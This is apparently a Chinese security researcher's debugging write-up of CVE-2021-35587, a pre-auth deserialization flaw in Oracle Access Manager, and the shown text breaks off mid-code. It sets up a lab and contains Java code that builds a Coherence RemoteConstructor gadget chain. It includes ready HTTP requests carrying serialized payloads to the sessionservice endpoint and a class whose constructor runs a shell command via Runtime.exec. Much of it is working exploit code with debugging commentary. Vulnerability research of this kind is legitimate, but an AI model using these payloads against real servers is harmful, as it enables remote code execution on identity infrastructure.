com/sun/tools/visualvm/modules/startup/AcceptLicense.class com/sun/tools/visualvm/modules/startup/LicensePanel.class com/sun/tools/visualvm/modules/startup/Utils.class com/sun/tools/visualvm/modules/startup/VisualVMStartup.class com/sun/tools/visualvm/modules/startup/dialogs/StartupDialog$1.class com/sun/tools/visualvm/modules/startup/dialogs/StartupDialog$2.class com/sun/tools/visualvm/modules/startup/dialogs/StartupDialog$3.class com/sun/tools/visualvm/modules/startup/dialogs/StartupDialog$4.class com/sun/tools/visualvm/modules/startup/dialogs/StartupDialog.class --- /u01/jdk/lib/visualvm/visualvm/core/locale/com-sun-tools-visualvm-modules-startup_zh_CN.jar --- /u01/jdk/lib/visualvm/visualvm/core/locale/core_visualvm.jar --- /u01/jdk/lib/visualvm/visualvm/core/locale/com-sun-tools-visualvm-modules-startup_ja.jar --- // 2. 定位关键类所在的jar包位置 # cls=\u0026#34;oracle.security.am.pbl.transport.http.AMServlet\u0026#34; # grep -P \u0026#34;$cls|\\.jar\u0026#34; oamms_tree.txt |grep -P \u0026#34;$cls\u0026#34; -B1 /u01/oracle/user_projects/domains/access_domain/servers/oam_policy_mgr1/tmp/_WL_user/oam-jars/1jy5pi/APP-INF/lib/pbl.jar oracle/security/am/pbl/transport/http/AMServlet$1.class oracle/security/am/pbl/transport/http/AMServlet.class -- /u01/oracle/user_projects/domains/access_domain/servers/AdminServer/tmp/_WL_user/oam-jars/n9twye/APP-INF/lib/pbl.jar oracle/security/am/pbl/transport/http/AMServlet$1.class oracle/security/am/pbl/transport/http/AMServlet.class -- /u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user/oam-jars/gkvqum/APP-INF/lib/pbl.jar oracle/security/am/pbl/transport/http/AMServlet$1.class oracle/security/am/pbl/transport/http/AMServlet.class # cls=\u0026#34;oracle.security.am.proxy.opensso.events.OpenssoCheckValidSessionEvent\u0026#34; # grep -P \u0026#34;$cls|\\.jar\u0026#34; oamms_tree.txt |grep -P \u0026#34;$cls\u0026#34; -B1 /u01/oracle/user_projects/domains/access_domain/servers/oam_policy_mgr1/tmp/_WL_user/oam-jars/1jy5pi/APP-INF/lib/openssoproxy.jar oracle/security/am/proxy/opensso/events/OpenssoCheckValidSessionEvent.class -- /u01/oracle/user_projects/domains/access_domain/servers/AdminServer/tmp/_WL_user/oam-jars/n9twye/APP-INF/lib/openssoproxy.jar oracle/security/am/proxy/opensso/events/OpenssoCheckValidSessionEvent.class -- /u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user/oam-jars/gkvqum/APP-INF/lib/openssoproxy.jar oracle/security/am/proxy/opensso/events/OpenssoCheckValidSessionEvent.class 可以看到 oracle.security.am.proxy.opensso.events.OpenssoCheckValidSessionEvent所在的jar包为openssoproxy.jar ，oracle.security.am.pbl.transport.http.AMServlet 所在jar包为 pbl.jar，他们都位于 /u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user/oam-jars/gkvqum/APP-INF/lib/ 目录下（注意：gkvqum是随机生成的目录，不同部署实例上的路径大概率是不同的，但目录结构是一样的）。所以我们将该目录下的jar包全部下载到调试主机上。\n⑤下载依赖包到调试主机 根据上一步知道我们关心的jar包应该主要是在 /u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user/oam-jars/gkvqum/APP-INF/lib/ 目录下。\n下载oracle依赖包\n1 2 docker exec oamms tar czf /tmp/oraclelib.tgz /u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user/oam-jars/gkvqum/APP-INF/lib/ docker cp oamms:/tmp/oraclelib.tgz . 此外我们后续调试还需要用到weblogic的jar包信息和coherence中的gadget信息，这里一并生成并下载\n生成和下载 wlfuulclient.jar\n1 2 docker exec oamms bash -c \u0026#34;cd /u01/oracle/wlserver/server/lib \u0026amp;\u0026amp; java -jar /u01/oracle/wlserver/modules/com.bea.core.jarbuilder.jar\u0026#34; docker cp oamms:/u01/oracle/wlserver/server/lib/wlfullclient.jar . 下载coherence依赖包\n1 2 docker exec oamms tar czf /tmp/coherencelib.tgz /u01/oracle/coherence/lib/ docker cp oamms:/tmp/coherencelib.tgz . 这就是我们需要的全部依赖包了\n⑥开始调试 在本地IDEA中新建一个maven项目\n将\\oracle\\user_projects\\domains\\access_domain\\servers\\oam_server1\\tmp\\_WL_user\\oam-jars\\gkvqum\\APP-INF\\lib 、/u01/oracle/coherence/lib/ 和 wlfullclient.jar 三个依赖添加到LIB。\n然后添加一个Remote Tomcat进行调试\n在openssoproxy.jar 包的函数oracle.security.am.proxy.opensso.events.OpenssoCheckValidSessionEvent#isRequesterSessionID 中下断点，发送步骤③所举例的基本请求。能够成功在断点处中止运行。\n至此已经可以调试oamms了。\n调试分析 反序列化入口 参考前述报错调用栈和漏洞作者分析文章\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;Mar 22, 2022 2:33:02,196 AM GMT\u0026gt; \u0026lt;Warning\u0026gt; \u0026lt;oracle.oam.binding\u0026gt; \u0026lt;BEA-000000\u0026gt; \u0026lt;Error while processing Master Controller in PBL java.lang.NullPointerException ★ at oracle.security.am.proxy.opensso.events.OpenssoCheckValidSessionEvent.isRequesterSessionID(OpenssoCheckValidSessionEvent.java:58) at oracle.security.am.proxy.opensso.controller.OpenssoFlowController.getNextEventHint(OpenssoFlowController.java:515) at oracle.security.am.controller.events.AbstractEventFlowController.getEventHint(AbstractEventFlowController.java:193) at oracle.security.am.controller.events.AbstractEventFlowController.getSuccessFailEvent(AbstractEventFlowController.java:158) at oracle.security.am.controller.events.AbstractEventFlowController.getNextEvent(AbstractEventFlowController.java:99) at oracle.security.am.controller.MasterController.getNextEvent(MasterController.java:236) at oracle.security.am.controller.MasterController.processEvent(MasterController.java:615) at oracle.security.am.controller.MasterController.processRequest(MasterController.java:788) at oracle.security.am.controller.MasterController.process(MasterController.java:708) at oracle.security.am.pbl.PBLFlowManager.delegateToMasterController(PBLFlowManager.java:221) at oracle.security.am.pbl.PBLFlowManager.handleBaseEvent(PBLFlowManager.java:147) at oracle.security.am.pbl.PBLFlowManager.processRequest(PBLFlowManager.java:107) at oracle.security.am.pbl.transport.http.AMServlet.handleRequest(AMServlet.java:221) ★ at oracle.security.am.pbl.transport.http.AMServlet.doPost(AMServlet.java:177) …… 在oracle.security.am.pbl.transport.http.AMServlet.doPost 和 oracle.security.am.pbl.PBLFlowManager#handleBaseEvent 附近下断点，发送以下请求\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 POST /oam/server/opensso/sessionservice HTTP/1.1 Host: 192.168.175.139:14100 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36 Connection: close Accept-Language: zh-CN,zh;q=0.9 Content-Type: text/xml Content-Length: 338 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt; \u0026lt;RequestSet vers=\u0026#34;vers123\u0026#34; svcid=\u0026#34;session\u0026#34; reqid=\u0026#34;req_1\u0026#34;\u0026gt; \u0026lt;Request dtdid=\u0026#34;dtd1\u0026#34; sid=\u0026#34;sid1\u0026#34;\u0026gt;\u0026lt;![CDATA[ \u0026lt;authIdentifier reqid=\u0026#34;1\u0026#34; requester=\u0026#34;b2JqZWN0OnJPMEFCWFFBRUdobGJHeHZJR3BoZG1GdlltcGxZM1E9\u0026#34;\u0026gt; \u0026lt;SessionID\u0026gt;123\u0026lt;/SessionID\u0026gt; \u0026lt;/authIdentifier\u0026gt; ]]\u0026gt; \u0026lt;/Request\u0026gt; \u0026lt;/RequestSet\u0026gt; 其中requester参数值为序列化数据加上object:前缀的base64编码后数据。\n1 2 $ echo b2JqZWN0OnJPMEFCWFFBRUdobGJHeHZJR3BoZG1GdlltcGxZM1E9 | base64 -d object:rO0ABXQAEGhlbGxvIGphdmFvYmplY3Q= 跟踪调试，到此处 oracle.security.am.proxy.opensso.controller.OpenssoEngineController#unmarshal 传入的requester参数对应的数据被反序列化。\n至此我们确定了反序列化的入口点是在 oracle.security.am.proxy.opensso.controller.OpenssoEngineController#unmarshal 。\n反序列化开始前的完整调用栈\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 unmarshal:2439, OpenssoEngineController (oracle.security.am.proxy.opensso.controller) processEvent:1069, OpenssoEngineController (oracle.security.am.proxy.opensso.controller) processEvent:596, MasterController (oracle.security.am.controller) processRequest:788, MasterController (oracle.security.am.controller) process:708, MasterController (oracle.security.am.controller) delegateToMasterController:221, PBLFlowManager (oracle.security.am.pbl) handleBaseEvent:147, PBLFlowManager (oracle.security.am.pbl) processRequest:107, PBLFlowManager (oracle.security.am.pbl) handleRequest:221, AMServlet (oracle.security.am.pbl.transport.http) doPost:177, AMServlet (oracle.security.am.pbl.transport.http) service:707, HttpServlet (javax.servlet.http) service:790, HttpServlet (javax.servlet.http) run:295, StubSecurityHelper$ServletServiceAction (weblogic.servlet.internal) run:260, StubSecurityHelper$ServletServiceAction (weblogic.servlet.internal) invokeServlet:137, StubSecurityHelper (weblogic.servlet.internal) execute:353, ServletStubImpl (weblogic.servlet.internal) doFilter:25, TailFilter (weblogic.servlet.internal) doFilter:78, FilterChainImpl (weblogic.servlet.internal) run:175, JpsAbsFilter$3 (oracle.security.jps.ee.http) doPrivileged:-1, AccessController (java.security) doAsPrivileged:315, JpsSubject (oracle.security.jps.util) runJaasMode:650, JpsPlatformUtil (oracle.security.jps.ee.util) runJaasMode:112, JpsAbsFilter (oracle.security.jps.ee.http) doFilterInternal:293, JpsAbsFilter (oracle.security.jps.ee.http) doFilter:150, JpsAbsFilter (oracle.security.jps.ee.http) doFilter:94, JpsFilter (oracle.security.jps.ee.http) doFilter:78, FilterChainImpl (weblogic.servlet.internal) doFilter:248, DMSServletFilter (oracle.dms.servlet) doFilter:78, FilterChainImpl (weblogic.servlet.internal) doFilter:92, ExtensibleGlobalFilter (oracle.jrf.servlet) doFilter:78, FilterChainImpl (weblogic.servlet.internal) wrapRun:3797, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal) run:3763, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal) doAs:344, AuthenticatedSubject (weblogic.security.acl.internal) runAsForUserCode:197, SecurityManager (weblogic.security.service) runAsForUserCode:203, WlsSecurityProvider (weblogic.servlet.provider) run:71, WlsSubjectHandle (weblogic.servlet.provider) doSecuredExecute:2451, WebAppServletContext (weblogic.servlet.internal) securedExecute:2299, WebAppServletContext (weblogic.servlet.internal) execute:2277, WebAppServletContext (weblogic.servlet.internal) runInternal:1720, ServletRequestImpl (weblogic.servlet.internal) run:1680, ServletRequestImpl (weblogic.servlet.internal) run:272, ContainerSupportProviderImpl$WlsRequestExecutor (weblogic.servlet.provider) _runAs:352, ComponentInvocationContextManager (weblogic.invocation) runAs:337, ComponentInvocationContextManager (weblogic.invocation) doRunWorkUnderContext:57, LivePartitionUtility (weblogic.work) runWorkUnderContext:41, PartitionUtility (weblogic.work) runWorkUnderContext:655, SelfTuningWorkManagerImpl (weblogic.work) execute:420, ExecuteThread (weblogic.work) run:360, ExecuteThread (weblogic.work) 构造SessionID对象触发正常反序列化 从代码 oracle.security.am.proxy.opensso.controller.OpenssoEngineController#unmarshal 看，接口 /oam/server/opensso/sessionservice 想要的对象数据是 oracle.security.am.proxy.opensso.session.utils.SessionID 类的。我们来构造一个可以正常完整触发反序列化的对象数据。\n生成requester中的序列化数据。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 package pers.neo; import oracle.security.am.proxy.opensso.session.utils.SessionID; import java.io.*; import java.util.Base64; public class App{ public static void main(String[] args) throws Exception { sessionidobj(); } public static void sessionidobj(){ // 生成一个最基本的sessionID SessionID sessionID=new SessionID(\u0026#34;neo\u0026#34;); System.out.println(oamserialize(sessionID)); } // https://gist.github.com/andy722/1524968 public static \u0026lt;T extends Serializable\u0026gt; String serialize(T item) { final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); final ObjectOutputStream objectOutputStream; try { objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(item); objectOutputStream.close(); return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()); } catch (IOException e) { throw new Error(e); } } public static \u0026lt;T extends Serializable\u0026gt; String oamserialize(T item) { String data=serialize(item); return Base64.getEncoder().encodeToString((\u0026#34;object:\u0026#34;+data).getBytes(StandardCharsets.UTF_8)); } } 发送请求\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 POST /oam/server/opensso/sessionservice HTTP/1.1 Host: 192.168.175.139:14100 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36 Connection: close Accept-Language: zh-CN,zh;q=0.9 Content-Type: text/xml Content-Length: 906 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt; \u0026lt;RequestSet vers=\u0026#34;vers123\u0026#34; svcid=\u0026#34;session\u0026#34; reqid=\u0026#34;req_1\u0026#34;\u0026gt; \u0026lt;Request dtdid=\u0026#34;dtd1\u0026#34; sid=\u0026#34;sid1\u0026#34;\u0026gt;\u0026lt;![CDATA[ \u0026lt;authIdentifier reqid=\u0026#34;1\u0026#34; requester=\u0026#34;b2JqZWN0OnJPMEFCWE55QURodmNtRmpiR1V1YzJWamRYSnBkSGt1WVcwdWNISnZlSGt1YjNCbGJuTnpieTV6WlhOemFXOXVMblYwYVd4ekxsTmxjM05wYjI1SlJLOGVKQWl5c3BxUUFnQUhXZ0FJYVhOUVlYSnpaV1JNQUFwamIyOXJhV1ZOYjJSbGRBQVRUR3BoZG1FdmJHRnVaeTlDYjI5c1pXRnVPMHdBRDJWdVkzSjVjSFJsWkZOMGNtbHVaM1FBRWt4cVlYWmhMMnhoYm1jdlUzUnlhVzVuTzB3QURXVjRkR1Z1YzJsdmJsQmhjblJ4QUg0QUFrd0FDbVY0ZEdWdWMybHZibk4wQUE5TWFtRjJZUzkxZEdsc0wwMWhjRHRNQUE5elpYTnphVzl1VTJWeWRtVnlTVVJ4QUg0QUFrd0FCSFJoYVd4eEFINEFBbmh3QUhCMEFBTnVaVzl3YzNJQUVXcGhkbUV1ZFhScGJDNUlZWE5vVFdGd0JRZmF3Y01XWU5FREFBSkdBQXBzYjJGa1JtRmpkRzl5U1FBSmRHaHlaWE5vYjJ4a2VIQS9RQUFBQUFBQUFIY0lBQUFBRUFBQUFBQjRkQUFBY0E9PQ==\u0026#34;\u0026gt; \u0026lt;SessionID\u0026gt;123\u0026lt;/SessionID\u0026gt; \u0026lt;/authIdentifier\u0026gt; ]]\u0026gt; \u0026lt;/Request\u0026gt; \u0026lt;/RequestSet\u0026gt; 反序列化现场\n关联漏洞：CVE-2020-14644 有了入口以后，我们还需要一个gadget来让执行流程最终走到自定义的恶意代码。作者在分析文章中说他们经过尝试发现 CVE-2020–14644 的gadget是可用的。于是我们先复现 CVE-2020–14644 。\n构造反序列化demo 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 //package pers.neo; //import com.tangosol.internal.util.invoke.ClassDefinition; //import com.tangosol.internal.util.invoke.ClassIdentity; //import com.tangosol.internal.util.invoke.RemoteConstructor; public static void cve_2020_14644() throws NotFoundException, IOException, CannotCompileException { ClassIdentity classIdentity = new ClassIdentity(test7.class); ClassPool cp = ClassPool.getDefault(); CtClass ctClass = cp.get(test7.class.getName()); ctClass.replaceClassName(test7.class.getName(), test7.class.getName() + \u0026#34;$\u0026#34; + classIdentity.getVersion()); RemoteConstructor constructor = new RemoteConstructor( new ClassDefinition(classIdentity, ctClass.toBytecode()), new Object[]{} ); String sobj = serialize(constructor); // System.out.println(sobj); deserialize(sobj); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 package pers.neo; import com.tangosol.internal.util.invoke.Remotable; import com.tangosol.internal.util.invoke.RemoteConstructor; import java.io.IOException; import java.io.Serializable; public class test7 implements Remotable,Serializable { public test7() { String cmd = \u0026#34;calc\u0026#34;; cmd=\u0026#34;touch /tmp/hackedbyneo7\u0026#34;; // cmd=\u0026#34;mkdir d:\\\\byoam\u0026#34;; try { Runtime.getRuntime().exec(cmd); } catch (IOException e) { e.printStackTrace(); } } public RemoteConstructor getRemoteConstructor() { return null; } public void setRemoteConstructor(RemoteConstructor remoteConstructor) { } } 需要注意的是，这里的test7必须实现Remotable和Serializable接口，否则会报错。\n记住这个 com.tangosol.internal.util.invoke.Remotable 接口，利用CVE-2020-14644时必须实现它，而利用CVE-2021-35587 时不需要实现它，这一点困扰了我很久。\n调试分析 开始反序列化 构建 RemoteConstructor 对象 我们要构建的对象属于 com.tangosol.internal.util.invoke.RemoteConstructor 类型，有m_aoArgs和m_definition两个属性，其中 m_aoArgs 是 [Ljava/lang/Object 类型，m_definition 是 Lcom/tangosol/internal/util/invoke/ClassDefinition 类型。\n从类定义来看也确实如此\n实例化一个 RemoteConstructor 对象\n填充属性\n读取并填充基本数据类型(primitive Data)，这个 RemoteConstructor 对象没有。\n基本数据类型有八类 （https://www.w3schools.com/java/java_data_types.asp）\nData Type Size Description byte 1 byte Stores whole numbers from -128 to 127 short 2 bytes Stores whole numbers from -32,768 to 32,767 int 4 bytes Stores whole numbers from -2,147,483,648 to 2,147,483,647 long 8 bytes Stores whole numbers from -9,223,372,036,854,775,808 to 9,223,372,036,854,775,807 float 4 bytes Stores fractional numbers. Sufficient for storing 6 to 7 decimal digits double 8 bytes Stores fractional numbers. Sufficient for storing 15 decimal digits boolean 1 bit Stores true or false values char 2 bytes Stores a single character/letter or ASCII values 有两个非基本数据类型的对象，逐一从数据流中读取并反序列化，放到objVals中\n构建Object[]对象（m_aoArgs） 属性一是一个Object Array\n构建 ClassDefinition 对象（m_definition） 反序列化属性二\n是一个对象\n具体来说是一个 com.tangosol.internal.util.invoke.ClassDefinition 类型的对象\n实例化ClassDefinition对象，有4个属性\n其中 m_id 和 m_abClass 可以通过序列化数据还原\n填充 ClassDefinition 对象\n读取基本数据类型的属性，也是空\n逐个读取 ClassDefinition 的属性\n构建Byte Array对象（m_abClass） m_abClass 是一个 byte Array\n读到的正是 test7 对象的字节码\n构建 ClassIdentity 对象（m_id） m_id 是一个Object\n实例化一个 com.tangosol.internal.util.invoke.ClassIdentity\n有 m_sPackage，m_sBaseName，m_sVersion 三个属性\n填充属性\n没有基本类型的数据\n依次构建m_sPackage/m_sBaseName/m_sVersion 读到 m_sBaseName 为 test7\n读到 m_sPackage 为 pers/neo\n读到m_sVersion 为 B9E9F4911DEBD39E951545194CDAB172\n完成 ClassIdentity 对象（m_id）填充 putObject是一个native函数\n完成填充\n完成ClassDefinition 对象（m_definition）填充 至此就创建完 RemoteConstructor 构造函数的两个参数对象了。\n1 2 3 4 RemoteConstructor constructor = new RemoteConstructor( new ClassDefinition(classIdentity, ctClass.toBytecode()), new Object[]{} ); 完成 RemoteConstructor 对象填充 readResolve 至此已经完成了 RemoteConstructor 对象的创建，但我们的恶意代码并没有被执行。这个名为obj的对象也不会直接返回给我们使用。\n在方法 java.io.ObjectInputStream#readOrdinaryObject return之前会先调用RemoteConstructor类的readResolve方法来创建一个实例rep，经过一些检查以后将rep赋值给obj，最终才返回。\n这些操作据称是为了防止反序列化动作创建的实例导致单例模式被破坏。\nreadResolve is used for replacing the object read from the stream. The only use I\u0026rsquo;ve ever seen for this is enforcing singletons; when an object is read, replace it with the singleton instance. This ensures that nobody can create another instance by serializing and deserializing the singleton.\n——https://stackoverflow.com/a/1168375/15103280\n正是在这个过程中我们的恶意代码被执行了。\nreadResolveMethod是 com.tangosol.internal.util.invoke.RemoteConstructor.readResolve()\n看看实现\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 //com.tangosol.internal.util.invoke.RemoteConstructor public Object readResolve() throws ObjectStreamException { return this.newInstance(); } public T newInstance() { RemotableSupport support = RemotableSupport.get(this.getClassLoader()); return support.realize(this); } //com.tangosol.internal.util.invoke.RemotableSupport public \u0026lt;T\u0026gt; T realize(RemoteConstructor\u0026lt;T\u0026gt; constructor) { ClassDefinition definition = this.registerIfAbsent(constructor.getDefinition()); Class\u0026lt;? extends Remotable\u0026gt; clz = definition.getRemotableClass(); if (clz == null) { synchronized(definition) { clz = definition.getRemotableClass(); if (clz == null) { definition.setRemotableClass(this.defineClass(definition)); //最终的Sink点 } } } Remotable\u0026lt;T\u0026gt; instance = (Remotable)definition.createInstance(constructor.getArguments()); instance.setRemoteConstructor(constructor); return instance; } 反射调用readResolve 反射调用obj对象的readResolve方法\n跟入调用\n调用到native层\nsink点 然后来到了 com.tangosol.internal.util.invoke.RemoteConstructor#readResolve\n进入到 com.tangosol.internal.util.invoke.RemotableSupport#realize\n创建恶意类：defineClass 需要注意的是我们的touch文件的操作在第64行的defineClass并没有执行，虽然看起来很像。\n这一行实际上做的事情就是根据definition的字节码在内存中创建类定义，然后通过setRemotableClass给m_clz和m_mhCtor赋值，还不涉及字节码对应的类的实例化和构造函数的执行。\n第64行执行前：\n第64行执行后：\n跟进查看defineClass如何起作用？\n第83行对类名做了替换\n这是因为创建ClassIdentity的时候做了替换\n1 2 3 4 //com.tangosol.internal.util.invoke.ClassIdentity public ClassIdentity(Class\u0026lt;?\u0026gt; clazz) { this(clazz.getPackage().getName().replace(\u0026#39;.\u0026#39;, \u0026#39;/\u0026#39;), clazz.getName().substring(clazz.getName().lastIndexOf(46) + 1), Base.toHex(md5(clazz))); } 跟进defineClass，最终会来到\n1 java.lang.ClassLoader#defineClass(java.lang.String, byte[], int, int, java.security.ProtectionDomain) 其中的defineClass1是native代码了\n实例化恶意类：createInstance 真正的sink点在createInstance：\n获取test7的构造函数并调用\n调用到native代码\n这里不知为何没有走到 java.lang.invoke.MethodHandle#invokeExact\n而是走到了 java.lang.invoke.Invokers#checkExactType，并且调用栈经过了一处 java.lang.invoke.LambdaForm#LambdaForm 暂时没搞懂是什么魔法。\n然后跳转到 LambdaForm ，走到 java.lang.invoke.Invokers#checkCustomized\n然后跳转到 LambdaForm ，走到 java.lang.invoke.MethodHandleImpl#checkSpreadArgument\n然后跳转到 LambdaForm ，走到 java.lang.invoke.Invokers#checkGenericType\n然后跳转到 LambdaForm ，又走到 java.lang.invoke.Invokers#checkCustomized\n然后跳转到 LambdaForm，走到 java.lang.invoke.DirectMethodHandle#allocateInstance\nsun.misc.Unsafe#allocateInstance定义如下\n根据描述，allocateInstance这个native函数只是创建一个实例，但没有执行任何构造函数。也确实观察到，到这里为止我们的touch文件的操作都还是没有发生。\n又经过一个魔法般的LambdaForm跳转，我们来到了 java.lang.invoke.DirectMethodHandle#constructorMethod\n执行构造函数（恶意代码） 又一次不知道怎么发生的LambdaForm跳转之后，我们来到了test7的构造函数。\n此时完整的调用栈如下\n至此我们就完成了整个gadget的跟踪。\n返回创建的对象 回到最开始的地方，将obj替换为rep\n这里check为null\n直接返回rep对象作为最终结果。\n构造payload 直接使用gadget：ClassNotFoundException 将CVE-2020-14644的这条gadget的序列化数据封装成接口 /oam/server/opensso/sessionservice 能够处理的数据：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 private static void cve_2020_14644() { ClassIdentity classIdentity = new ClassIdentity(test7.class); ClassPool cp = ClassPool.getDefault(); CtClass ctClass = null; try { ctClass = cp.get(test7.class.getName()); ctClass.replaceClassName(test7.class.getName(), test7.class.getName() + \u0026#34;$\u0026#34; + classIdentity.getVersion()); RemoteConstructor constructor = new RemoteConstructor( new ClassDefinition(classIdentity, ctClass.toBytecode()), new Object[]{} ); String sobj = oamserialize(constructor); System.out.println(sobj); } catch (Exception e) { throw new RuntimeException(e); } } 进入到readOrdinaryObject()\nisInstantiable()返回false\n这个方法在1.）类是externalizable 的且有public的无参构造器2.）类是non-externalizable且第一个不可序列化父类有可访问的无参构造器时返回true，其余时候返回false。\nexternalizable和serializable的区别：简单来说，前者可以保存对象的全部或一部分的状态，过程完全由程序逻辑控制，后者必须全部保存，过程由JVM完全控制。\nThe process of writing the state of an object to a file is called serialization, but strictly speaking, it is the process of converting an object from java supported form into a file-supported form or network-supported form by using fileOutputStream and objectOutputStream classes we can implement serialization.\nBut we can serialize only serializable objects. An object is said to be serializable if and only if the corresponding class implements a Serializable interface. Serializable interface is present in java.io package, and it doesn’t contain any method and hence it is a marker interface. If we are trying to serializable a non-serializable object then we will get Runtime Exception saying notSerializableException.\n\u0026hellip;\nIn serialization, everything is taken care of by JVM and the programmer doesn’t have any control. In serialization, it is always possible to solve the total object to file, and it is not possible to save part of the object which may create performance problems. To overcome this problem we should go for externalization.\nThe main advantage of Externalizable over serialization is, everything is taken care of by the programmer and JVM doesn’t have any control. Based on our requirements we can save either the total object or part of the object which improves the performance of the system. To provide the generalizable ability for any java object, it’s a mandate for the corresponding class to implement a generalizable interface.\n\u0026hellip;\n——https://www.geeksforgeeks.org/difference-between-serializable-and-externalizable-in-java-serialization/\n可以看到这是一个non-externalizable的类，而com.tangosol.internal.util.invoke.RemoteConstructor是有无参构造器的，那么为什么会返回false呢？\n对比CVE-2020-14644的ObjectStreamClass对象desc和CVE-2021-35587的desc\n后者没有找到构造器cons\n前者有\n所以后者的isInstantiable()返回了false。\n至于为什么两种环境下识别到的cons不同，让我们跟入 java.io.ObjectInputStream#readClassDesc 对比一下。\n会进入到readNonProxyDesc(boolean unshared)\nweblogic环境下，ClassLoader是 sun.misc.Launcher.AppClassLoader#AppClassLoader，加载了134个类\nclass com.tangosol.internal.util.invoke.RemoteConstructor 就在其中\n执行以下代码确认存在\n1 2 3 4 5 6 Iterator iterator=latestUserDefinedLoader().classes.iterator(); String res=\u0026#34;\u0026#34;; while(iterator.hasNext()){ if(iterator.next().toString().equals(\u0026#34;class com.tangosol.internal.util.invoke.RemoteConstructor\u0026#34;))res=\u0026#34;exist\u0026#34;; } res 于是成功获取到类\nweblogic环境中完成resolve以后，还会进入 filterCheck黑名单校验\n黑名单列表如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 !com.bea.core.repackaged.springframework.aop.aspectj.* !com.bea.core.repackaged.springframework.aop.aspectj.annotation.* !com.bea.core.repackaged.springframework.aop.aspectj.autoproxy.* !com.bea.core.repackaged.springframework.beans.factory.support.* !com.bea.core.repackaged.springframework.transaction.support.AbstractPlatformTransactionManager !com.sun.org.apache.xalan.internal.xsltc.trax.* !java.rmi.activation.* !java.rmi.server.RemoteObject !java.rmi.server.RemoteObjectInvocationHandler !java.rmi.server.UnicastRemoteObject !javassist.* !org.apache.commons.collections.functors.* !org.codehaus.groovy.runtime.ConversionHandler !org.codehaus.groovy.runtime.ConvertedClosure !org.codehaus.groovy.runtime.MethodClosure !org.jboss.interceptor.builder.* !org.jboss.interceptor.proxy.* !org.jboss.interceptor.reader.* !org.jboss.interceptor.spi.metadata.* !org.jboss.interceptor.spi.model.* !org.python.core.* !org.springframework.transaction.support.AbstractPlatformTransactionManager !sun.rmi.server.* 显然 com.tangosol.internal.util.invoke.RemoteConstructor 不在其中。\n而OAM环境下的ClassLoader是weblogic.utils.classloaders.GenericClassLoader，其中加载了2314个类\n并且其中有一个classPatterns列表\n1 2 3 4 5 0 = {Pattern@37540} \u0026#34;^org.apache.commons.logging.{0,1}\u0026#34; 1 = {Pattern@37541} \u0026#34;^oracle.security.am.{0,1}\u0026#34; 2 = {Pattern@37542} \u0026#34;^com.tangosol.{0,1}\u0026#34; 3 = {Pattern@37543} \u0026#34;^org.eclipse.higgins.configuration.{0,1}\u0026#34; 4 = {Pattern@37544} \u0026#34;^org.python.{0,1}\u0026#34; 这个classPatterns用来判断是否委派给双亲\n但classLoader中还是有不少这样pattern的类的\n1 2 3 4 5 6 7 8 9 10 11 12 13 Iterator iterator=latestUserDefinedLoader().classes.iterator(); List\u0026lt;String\u0026gt; res= new ArrayList\u0026lt;String\u0026gt;(); while(iterator.hasNext()){ String item= iterator.next().toString(); if(item.startsWith(\u0026#34;class org.apache.commons.logging\u0026#34;) || item.startsWith(\u0026#34;class oracle.security.am\u0026#34;) || item.startsWith(\u0026#34;class com.tangosol\u0026#34;) || item.startsWith(\u0026#34;class org.eclipse.higgins.configuration\u0026#34;) || item.startsWith(\u0026#34;class org.python\u0026#34;)){ res.add(item); } } res OAM中没有获取到类，并且抛出了异常\n1 java.lang.ClassNotFoundException: com.tangosol.internal.util.invoke.RemoteConstructor class com.tangosol.internal.util.invoke.RemoteConstructor 也确实不在其中\n延长gadget 参考网上资料发现类 weblogic.rmi.provider.BasicServiceContext 有一个属性是object类型\n延长利用链到这个类即可\n1 2 3 4 5 6 7 8 9 10 11 12 public static void cve_2021_35587(Class poccls) throws Exception { ClassIdentity classIdentity = new ClassIdentity(poccls); ClassPool cp = ClassPool.getDefault(); CtClass ctClass = cp.get(poccls.getName()); ctClass.replaceClassName(poccls.getName(), poccls.getName() + \u0026#34;$\u0026#34; + classIdentity.getVersion()); RemoteConstructor constructor = new RemoteConstructor( new ClassDefinition(classIdentity, ctClass.toBytecode()), new Object[]{} ); BasicServiceContext 